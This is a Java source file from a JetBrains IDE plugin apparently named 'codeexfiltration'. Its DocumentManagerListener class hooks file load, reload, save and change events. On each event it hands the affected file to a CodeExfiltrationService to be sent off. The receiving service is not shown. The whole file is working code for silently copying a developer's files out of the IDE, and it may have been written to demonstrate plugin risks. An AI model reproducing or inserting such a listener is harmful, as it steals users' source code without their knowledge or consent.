package com.chriscarini.jetbrains.codeexfiltration.file;

import com.chriscarini.jetbrains.codeexfiltration.services.CodeExfiltrationService;
import com.intellij.openapi.application.ApplicationManager;
import com.intellij.openapi.diagnostic.Logger;
import com.intellij.openapi.editor.Document;
import com.intellij.openapi.fileEditor.FileDocumentManager;
import com.intellij.openapi.fileEditor.FileDocumentManagerAdapter;
import com.intellij.openapi.fileEditor.FileDocumentManagerListener;
import com.intellij.openapi.vfs.VfsUtil;
import com.intellij.openapi.vfs.VirtualFile;
import org.jetbrains.annotations.NotNull;

import java.io.File;

public class DocumentManagerListener implements FileDocumentManagerListener {
    private static final Logger LOG = Logger.getInstance(DocumentManagerListener.class);

    @Override
    public void beforeDocumentSaving(@NotNull final Document document) {
        final VirtualFile virtualFile = FileDocumentManager.getInstance().getFile(document);
        if (virtualFile != null) {
            sendFile(virtualFile);
        }
    }

    @Override
    public void beforeFileContentReload(final VirtualFile file, @NotNull final Document document) {
        sendFile(file);
    }

    @Override
    public void fileContentLoaded(@NotNull final VirtualFile virtualFile, @NotNull final Document document) {
        sendFile(virtualFile);
    }

    @Override
    public void fileContentReloaded(@NotNull final VirtualFile file, @NotNull final Document document) {
        sendFile(file);
    }

    @Override
    public void fileWithNoDocumentChanged(@NotNull final VirtualFile file) {
        sendFile(file);
    }

    @Override
    public void beforeAllDocumentsSaving() {
    }

    @Override
    public void unsavedDocumentsDropped() {
    }

    private void sendFile(@NotNull final VirtualFile virtualFile) {
        ApplicationManager.getApplication().invokeLater(() -> {
            final File file = VfsUtil.virtualToIoFile(virtualFile);
            if (virtualFile.exists() && file.exists() && file.isFile()) {
                CodeExfiltrationService.getInstance().sendFile(file);
            } else {
                LOG.debug("File no longer exists.");
            }
        });
    }
}
